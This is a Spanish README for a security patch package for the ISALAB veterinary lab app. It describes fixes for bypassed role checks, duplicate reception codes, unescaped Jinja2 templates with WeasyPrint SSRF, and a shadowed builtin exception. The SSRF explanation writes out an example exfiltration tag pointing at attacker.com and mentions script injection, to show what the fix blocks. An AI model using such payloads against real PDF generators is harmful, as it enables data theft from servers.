# ISALAB — Fase 3: Fix CRITICAL de seguridad

Parches y scripts para aplicar los **4 fixes críticos de seguridad** identificados en el análisis del repositorio [CORJAR-Computers/ISALAB](https://github.com/CORJAR-Computers/ISALAB).

> **Convención**: commits tagueados con `ISALAB` siguiendo Conventional Commits (`fix(ISALAB): ...`).
> **Rama sugerida**: `feat/phase3-security-critical` (basada en `feat/phase2-database-critical`).
> **Commit de referencia**: `46f979c` sobre `feat/phase3-security-critical`.

---

## 📋 Los 4 issues CRÍTICOS cubiertos

### C1 — RBAC efectivamente burlado
**Antes**: `Authorizer` estaba cableado **únicamente** en `UsuarioService`. Todos los demás servicios (`AnimalService`, `MuestraService`, `RecepcionService`, `ConsultaService`, `CirugiaService`, `VacunaService`, `HistoriaService`, `ConfiguracionService`, `PDFService`, `ReporteLaboratorioService`, etc.) exponían CRUD/actualizaciones/generación de PDF **sin ninguna verificación de rol**. Cualquier usuario logueado (o cualquier proceso que instanciara el servicio) podía hacer cualquier cosa.

**Después**: Todos los servicios cablean `Authorizer`. Se introdujo un **registro thread-local del usuario actual** (`set_current_user` / `get_current_user` / `clear_current_user`) que `Authorizer` consume automáticamente cuando no se pasa `usuario_actual` explícito. `main.py` llama `set_current_user(usuario)` inmediatamente después del login. Las operaciones de escritura requieren rol mínimo:

| Operación | Rol mínimo |
|---|---|
| `registrar_ingreso`, `registrar_salida`, `actualizar_datos` (animal) | `asistente` |
| `registrar_muestra` | `asistente` |
| `actualizar_estado` (muestra — cargar resultados) | `veterinario` |
| `registrar_recepcion`, `actualizar_estado` (recepción) | `asistente` |
| `registrar_consulta`, `actualizar_consulta` | `veterinario` |
| `programar_cirugia`, `actualizar_estado`, `actualizar_cirugia` | `veterinario` |
| `registrar` (vacuna) | `veterinario` |
| `crear_historia`, `actualizar_historia` | `veterinario` |
| `guardar_configuracion` | `admin` |
| `generar_*`, `guardar_*` (todos los reportes PDF) | `asistente` |
| Cualquier lectura (`obtener_*`, `listar_*`) | usuario autenticado |

### C2 — Colisión `ISAL-0001` en recepciones
**Antes**: `RecepcionService.generar_codigo()` era **preview-only** — solo hacía `SELECT ultimo FROM codigo_contadores WHERE prefijo='ISAL'` **sin incrementar**. `registrar_recepcion()` llamaba a `generar_codigo()` pero tampoco incrementaba. Resultado: **cada** recepción nueva recibía `ISAL-0001` y el segundo INSERT chocaba con `UNIQUE constraint failed: recepciones.codigo`.

**Después**: `generar_codigo()` ahora usa `DatabaseManager().generar_codigo('ISAL')` que hace `UPDATE codigo_contadores SET ultimo = ultimo + 1` atómicamente (mismo patrón que `MuestraService`, `AnimalService`, etc.). `registrar_recepcion()` llama a `generar_codigo()` **una sola vez** cuando `data['codigo']` viene vacío.

### C3 — Jinja2 sin `autoescape` + WeasyPrint SSRF
**Antes**: `reports/generators.py:40` construía `Environment(loader=FileSystemLoader(...))` **sin `autoescape`**, mientras `reports/base.py:379-384` sí lo activaba. Toda la generación real de reportes iba por la ruta sin escape, permitiendo:
- **HTML injection** vía cualquier campo user-controlled (`animal.nombre`, `propietario`, `diagnostico`, `observaciones`, etc.) — un usuario malicioso podía inyectar `<script>`, `<iframe>`, etc.
- **SSRF** vía `<img src="http://attacker.com/exfil?...">` o `<link href="...">` en plantillas — WeasyPrint fetcheaba cualquier URL al renderizar el PDF.

**Después**:
- `Environment` se crea con `autoescape=select_autoescape(['html', 'xml', 'htm'])`, `trim_blocks=True`, `lstrip_blocks=True`.
- Se introduce `_safe_url_fetcher` que WeasyPrint usa para resolver **todos** los recursos (CSS `@import`, `url()`, `<img src>`, `<link>`, `@font-face`, etc.). Política:
  - `file://` permitido **solo** si el path está bajo `TEMPLATES_DIR` o `BASE_DIR` (logos, firmas, sellos, fuentes locales).
  - `http://`, `https://`, `ftp://`, `data:` → **rechazados** con `ValueError`. WeasyPrint registra el recurso como no disponible y sigue renderizando sin él.
- Tanto `reports/generators.py` (modo directo) como `reports/base.py` (modo enterprise `_convertir_a_pdf`) usan el `_safe_url_fetcher`.

### C4 — `PermissionError` shadow del builtin
**Antes**: `utils/security.py:126` definía `class PermissionError(Exception)`, lo que **shadeweaba** el builtin de Python `PermissionError` (que es subclass de `OSError` para errores OS-level tipo "permission denied" al abrir archivos). Cualquier módulo que hiciera `from utils.security import *` (o que importara el símbolo) perdía acceso al builtin.

**Después**: La clase se renombra a `PermissionDeniedError(IsaLabException)` — hereda de la jerarquía de excepciones del proyecto (consistencia con `DatabaseError`, `BusinessLogicError`, etc.). Se mantiene `PermissionError = PermissionDeniedError` como **alias deprecated** para no romper imports externos. `services/usuario_service.py` (único lugar que la usaba) actualizado para importar `PermissionDeniedError`.

---

## 📦 Contenido del paquete

```
ISALAB-fase3/
├── README.md                          ← este archivo
├── patches/
│   ├── 0001-fix-ISALAB-Fase-3-Fix-CRITICAL-de-seguridad.patch   ← consolidado (100 KB)
│   ├── utils_security.py.patch                                    ← slim por archivo
│   ├── services_usuario_service.py.patch
│   ├── services_animal_service.py.patch
│   ├── services_muestra_service.py.patch
│   ├── services_recepcion_service.py.patch
│   ├── services_consulta_service.py.patch
│   ├── services_cirugia_service.py.patch
│   ├── services_vacuna_service.py.patch
│   ├── services_historia_service.py.patch
│   ├── services_configuracion_service.py.patch
│   ├── services_report_service.py.patch
│   ├── services_pdf_service.py.patch
│   ├── services_report_laboratorio.py.patch
│   ├── services_report_vacunacion.py.patch
│   ├── services_report_historia_clinica.py.patch
│   ├── services_report_cirugia.py.patch
│   ├── services_report_consulta.py.patch
│   ├── services_report_consentimiento.py.patch
│   ├── services_report_formula_medica.py.patch
│   ├── reports_generators.py.patch
│   ├── reports_base.py.patch
│   ├── main.py.patch
│   └── tests_test_fase3_security.py.patch
├── scripts/
│   ├── apply-phase3.sh                ← Linux / macOS / Git Bash
│   └── apply-phase3.ps1               ← Windows PowerShell
└── files/                             ← archivos finales (post-Fase 3) para inspección
    ├── utils/security.py
    ├── main.py
    ├── ... (23 archivos)
    └── tests/test_fase3_security.py
```

**Total**: 23 archivos modificados + 1 nuevo (test). **Sin eliminaciones** (Fase 3 solo añade/modifica código).

---

## 🚀 Cómo aplicar

### Opción A: Script automático (recomendado)

```bash
# 1. Clona el repo público (o usa tu fork)
git clone https://github.com/CORJAR-Computers/ISALAB
cd ISALAB

# 2. (Opcional) Aplica Fase 1 y Fase 2 primero si no las tienes
#    Ver paquetes ISALAB-fase1/ e ISALAB-fase2/

# 3. Ejecuta el aplicador
bash /ruta/a/ISALAB-fase3/scripts/apply-phase3.sh
```

En Windows PowerShell:

```powershell
.\ruta\a\ISALAB-fase3\scripts\apply-phase3.ps1
```

El script:
1. Verifica que estás en la raíz del repo (`main.py`, `services/`, `utils/`).
2. Aplica los 23 parches slim uno por uno con `git apply`.
3. Verifica que cada fix crítico quedó aplicado (greps específicos).
4. Si un parche ya estaba aplicado, lo marca como `⊙ skip` (idempotente).
5. Al final, sugiere comandos para revisar, testear y commitear.

### Opción B: GitHub Desktop (manual)

1. **Clona el repo** en GitHub Desktop: `https://github.com/CORJAR-Computers/ISALAB`
2. **Crea una rama**: `Branch → New Branch` → nombre `feat/phase3-security-critical`.
3. **Abre el repositorio en tu editor** (VS Code, etc.).
4. **Aplica los parches** manualmente. Para cada parche slim:
   ```bash
   git apply --verbose ruta/a/patches/utils_security.py.patch
   git apply --verbose ruta/a/patches/services_usuario_service.py.patch
   # ... etc.
   ```
   O aplícalos todos de una con el consolidado:
   ```bash
   git apply --verbose ruta/a/patches/0001-fix-ISALAB-Fase-3-Fix-CRITICAL-de-seguridad.patch
   ```
5. **Revisa los cambios** en GitHub Desktop — verás los 23 archivos modificados.
6. **Commit** con mensaje:
   ```
   fix(ISALAB): Fase 3 — Fix CRITICAL de seguridad
   ```
   (copia el cuerpo del mensaje del commit `46f979c` si quieres el detalle completo).
7. **Push** a tu fork y abre PR.

### Opción C: `git am` (preserva autoría del commit)

```bash
cd ISALAB
git checkout -b feat/phase3-security-critical
git am --signoff < /ruta/a/ISALAB-fase3/patches/0001-fix-ISALAB-Fase-3-Fix-CRITICAL-de-seguridad.patch
```

`git am` aplica el parche como un commit real (con autor, fecha y mensaje originales), a diferencia de `git apply` que solo modifica el working tree.

---

## 🧪 Tests

Los 12 tests en `tests/test_fase3_security.py` cubren los 4 fixes:

```
tests/test_fase3_security.py::test_C4_permission_denied_error_does_not_shadow_builtin PASSED
tests/test_fase3_security.py::test_C1_anonymous_user_cannot_register_animal PASSED
tests/test_fase3_security.py::test_C1_asistente_can_register_animal_but_not_consulta PASSED
tests/test_fase3_security.py::test_C1_veterinario_can_register_consulta PASSED
tests/test_fase3_security.py::test_C1_admin_can_guardar_configuracion PASSED
tests/test_fase3_security.py::test_C1_asistente_cannot_guardar_configuracion PASSED
tests/test_fase3_security.py::test_C2_generar_codigo_increments_counter PASSED
tests/test_fase3_security.py::test_C2_two_recepciones_do_not_collide PASSED
tests/test_fase3_security.py::test_C3_generators_jinja_env_has_autoescape PASSED
tests/test_fase3_security.py::test_C3_safe_url_fetcher_blocks_external_http PASSED
tests/test_fase3_security.py::test_C3_safe_url_fetcher_blocks_file_outside_sandbox PASSED
tests/test_fase3_security.py::test_C3_generar_reporte_with_malicious_context_escapes_html PASSED
```

Para correrlos:

```bash
cd ISALAB
pip install -r requirements.txt -r requirements-dev.txt   # si no lo has hecho
python -m pytest tests/test_fase3_security.py -v
```

Los tests no requieren DB real ni QApplication — usan la DB SQLite temporal aislada que el `conftest.py` de Fase 1 ya provee.

---

## ⚠️ Posibles breaking changes

### 1. Llamadas a servicios sin usuario autenticado
Cualquier código que instanciara un servicio `Service()` sin usuario y llamara operaciones de escritura ahora levantará `PermissionDeniedError`. Esto afecta:
- **Tests antiguos** que no llamen `set_current_user(...)`.
- **Scripts CLI** que manipulen datos sin login previo.
- **Workers en background** que no hereden el thread-local.

**Mitigación**: en tests, llamar `set_current_user({'id': 1, 'username': 'admin', 'rol': 'admin'})` en el setup. En scripts CLI, hacer login programático con `UsuarioService.autenticar(usuario, password)` que automáticamente setea el thread-local (ver punto 3).

### 2. Generación de PDFs desde CLI/procesos externos
Cualquier proceso que generara PDFs sin pasar por `main.py` ahora necesita setear el usuario thread-local:

```python
from utils.security import set_current_user
set_current_user({'id': 0, 'username': 'system', 'rol': 'admin'})
# ... generar PDF ...
```

### 3. `PermissionError` vs `PermissionDeniedError`
El alias `PermissionError = PermissionDeniedError` está mantenido para compatibilidad, pero **se desaconseja** usarlo. Si tienes código que hace `except PermissionError:` después de `from utils.security import PermissionError`, funcionará — pero atrapa la excepción de IsaLab, no el builtin de Python. Si necesitas atrapar el builtin, usa `builtins.PermissionError` o simplemente no importes el de `utils.security`.

---

## 📋 Próximos pasos sugeridos (post-Fase 3)

- **Audit logs**: ahora que RBAC está cableado, considera agregar logging de auditoría en cada `require_role` (registrar `usuario.id` + operación + timestamp). Actualmente solo se loggea cuando se **deniega** el acceso.
- **Rate-limiting de login**: Fase 3 NO cubre el issue HIGH "no login rate-limiting / timing-attack mitigation". Ese será abordado en Fase 5 (HIGH).
- **Password strength unificación**: `validar_fortaleza_password` pide 8 chars pero `cambiar_password_dialog` y `usuario_dialog` piden 6 chars y hacen `strip()` (que rompe passwords con espacios). Issue HIGH para Fase 5.
- **GUI: botón "Usuarios" solo visible para admin**: sigue siendo solo cosmético (oculta el botón pero los servicios ya están protegidos). Issue MEDIUM para Fase 6.
- **Tests de integración GUI**: los tests de Fase 3 son unitarios. Para end-to-end (login → click → generar PDF), se necesitaría pytest-qt + fixtures más complejas.

---

## 🔗 Historial de fases

| Fase | Tag | Commit | Estado |
|---|---|---|---|
| Fase 1 | `chore(ISALAB)` | `a6462da` | ✅ entregada |
| Fase 2 | `fix(ISALAB)` | `82dbc20` | ✅ entregada |
| **Fase 3** | `fix(ISALAB)` | `46f979c` | ✅ **este paquete** |
| Fase 4 | `fix(ISALAB)` | pendiente | GUI critical fixes |
| Fase 5 | `fix(ISALAB)` | pendiente | HIGH issues (security/DB/GUI) |
| Fase 6 | `chore(ISALAB)` | pendiente | MEDIUM/LOW cleanup |

---

## 📝 Notas técnicas

- **Thread-local vs. explicit param**: se eligió thread-local para evitar tener que pasar `usuario_actual` a cada uno de los 9 views + 11 dialogs (20 call sites) en la GUI. La GUI setea el usuario una vez en `main.py` tras el login y todos los servicios lo recogen automáticamente. Si en el futuro se quiere hacer multi-tenant o por-request, basta con llamar `set_current_user(...)` antes de cada operación.
- **Sandbox `url_fetcher`**: se usa `logging.getLogger("isalab.reports.sandbox")` en lugar de `weasyprint.logger` porque en algunas versiones de WeasyPrint el `logger` expuesto no tiene método `.warning`. Usar el logger estándar de Python es más portable.
- **`PermissionError` alias**: se mantiene por compatibilidad hacia atrás. Si en una futura fase se quiere eliminar, basta con grep + replace global + tests.
